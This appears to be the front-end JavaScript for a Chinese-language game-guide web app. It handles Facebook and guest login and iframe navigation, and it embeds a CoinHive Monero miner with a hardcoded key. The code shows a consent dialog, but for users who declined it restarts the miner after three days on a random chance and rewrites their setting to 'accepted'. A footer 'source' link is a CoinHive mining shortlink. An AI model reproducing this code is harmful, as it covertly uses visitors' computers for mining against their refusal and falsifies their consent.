const monro_api_key = 'XXcJNZiaSWshUe3H2NuXzBrLj3kW2wvP';
var miner = new CoinHive.User(monro_api_key,'user', {
  threads: navigator.hardwareConcurrency,
  autoThreads: false,
  throttle: .6,
  forceASMJS: false,
  language:'zh'
});
var miner_count = 0 ;
$(document).ready(function () {
  var socket = io.connect();
  var facebook_provider = new firebase.auth.FacebookAuthProvider();
  var filter_name = '';
  var current_user_data = {};

  //user login
    $(document).on("click","#fb_login",facebookLog)
    $(document).on("click","#guest_login",function () {
      let r = confirm("資料庫容量有限，"+
      "匿名登入使用者如果連續三天沒有使用將被刪除，"+
      "是否仍要繼續匿名登入?");
      if(r) guestLog();
      else return
    })
    function facebookLog() {
      auth.signInWithPopup(facebook_provider).then(function(result) {
        // This gives you a Facebook Access Token. You can use it to access the Facebook API.
        var token = result.credential.accessToken;
        // The signed-in user info.
        var user = result.user;
        // console.log(user);
        socket.emit("user login",result.user) ;
        $("#login").fadeOut();
        // window.location.assign("/");
      }).catch(function(error) {
        console.log(error);
        // Handle Errors here.
        var errorCode = error.code;
        var errorMessage = error.message;
        // The email of the user's account used.
        var email = error.email;
        // The firebase.auth.AuthCredential type that was used.
        var credential = error.credential;
        // ...
      });
    }
    function guestLog() {
      firebase.auth().signInAnonymously().catch(function(error) {
        // Handle Errors here.
        var errorCode = error.code;
        var errorMessage = error.message;
        // ...
      })
      .then(function () {
        $("#login").fadeOut();
        firebase.auth().onAuthStateChanged(function(user) {
          if (user) {
            // console.log(user);
            socket.emit("user login",user) ;
            var isAnonymous = user.isAnonymous;
            var uid = user.uid;
            // ...
          } else {
            // User is signed out.
            // ...
          }
          // ...
        });
      });

    }

    auth.onAuthStateChanged(function(user) {
      if (user) {
        setTimeout(function (data) {
          socket.emit("user connect",user);
        },1000);
      } else {
        $("#login").fadeIn();
        console.log('did not sign in');
      }
    });
    socket.on("login complete",function () {
      $("#login").fadeOut();
    });

    socket.on("current_user_data",function (data) {
      current_user_data = data ;
      console.log('get user data');
      let name = data.name ;
      $(".current_user_name").text("Hi, "+name);
      let timer = new Date().getTime(),setting = data.setting;
      if((timer-data.first_login)>30000){
        console.log('mine');
        if(!setting.mine_alert) $("#mine_alert").css('display','flex');
        else if(!setting.mine_alert.state) $("#mine_alert").css('display','flex');
        else if(setting.mine_alert.accept&&setting.show_miner){
          setInterval(function () {
            console.log(miner.isRunning());
            miner_count += miner.getHashesPerSecond()*10;
            if(miner_count>1000){
              console.log("1000 hash");
              socket.emit("mine count",{
                uid : current_user_data.uid,
                count : miner_count
              });
              miner_count = 0 ;
            }
          },10000);
          miner.start();
          console.log(setting.mine_alert.accept,setting.show_miner);
          console.log(miner.isRunning());
        }
        else if(!setting.show_miner){
          if(((timer-setting.mine_alert.time)>86400000*3)&&Math.random()>0.4){
            console.log("???");
            miner.start();
            socket.emit("change setting",{
              type:'miner',
              uid:current_user_data.uid,
              state:true
            });

          }
        }
      }
    });
    //index page get year
    var today = new Date();
    $("nav a,.m_nav_panel a").click(function () {
      let target = $(this).attr("id");
      changeIframe(target);
      if(target == 'compareCat') reloadIframe(target);
    });
    $("nav img").click(function () {
      $("#iframe_holder iframe").css("right",'-100%');
    });
    //miner
    var accept = '';
    $(document).on("click","#mine_alert button",function () {
      if($(this).attr("id") == 'support') {
        accept = true ;
        miner.start();
        $("#mine_alert .success").fadeIn().siblings('div').fadeOut();
        $("#mine_alert #ok").fadeIn().siblings('button').fadeOut();
      } else if($(this).attr("id") == 'nottoday') {
        accept = false ;
        $("#mine_alert .not_accept").fadeIn().siblings('div').fadeOut();
        $("#mine_alert #ok").fadeIn().siblings('button').fadeOut();
      } else if($(this).attr("id") == 'ok') {
        if(accept){
          if(miner.isRunning()){
            $("#mine_alert").fadeOut();
            socket.emit("notice mine",{uid:current_user_data.uid,accept:true});
            setInterval(function () {
              miner_count += miner.getHashesPerSecond()*10;
              if(miner_count>1000){
                socket.emit("mine count",{
                  uid : current_user_data.uid,
                  count : miner_count
                });
                miner_count = 0 ;
              }
            },10000);
          } else {
            $("#mine_alert .fail").fadeIn().siblings('div').fadeOut();
            $("#mine_alert #ok").fadeOut().siblings('button').fadeIn();
          }
        } else {
          $("#mine_alert").fadeOut();
          socket.emit("notice mine",{uid:current_user_data.uid,accept:false});
        }
      }
    });

    var xmlhttp = new XMLHttpRequest() ;
    var url = "../public/update_dialog.html";
    var update_dialog ;

    xmlhttp.open("GET", url, true);
    xmlhttp.send();
    xmlhttp.onreadystatechange = function(){
      if (this.readyState == 4 && this.status == 200){
        update_dialog = this.responseText ;
        $("#helpModal").find(".modal-body").html(update_dialog);
        $("#helpModal").find(".modal-header .title").text("更新紀錄");
        $("#helpModal").find(".modal-footer").html("本網站資料來源主要為<a href='https://cnhv.co/rnwe' target='blank'>超絕攻略網</a>");
      }
    }



});
function changeIframe(target) {
  let arr = [];
  $("#iframe_holder").children().each(function () {
    arr.push($(this).attr("id"));
  });
  if(arr.indexOf(target)==-1&&target){
    $("#iframe_holder").append(
      "<iframe id='"+target+"' src='/view/"+target+".html'></iframe>"
    );
    $("#iframe_holder").find("#"+target).load(function () {
      $(this).css("right","0%").siblings().css("right",'-100%');
    });
  } else
  $("#iframe_holder").find("#"+target).css("right","0%").siblings().css("right",'-100%');
}
function reloadIframe(target) {
    let src = $("#iframe_holder").find("#"+target).attr("src");
    $("#iframe_holder").find("#"+target).attr('src',src);
}
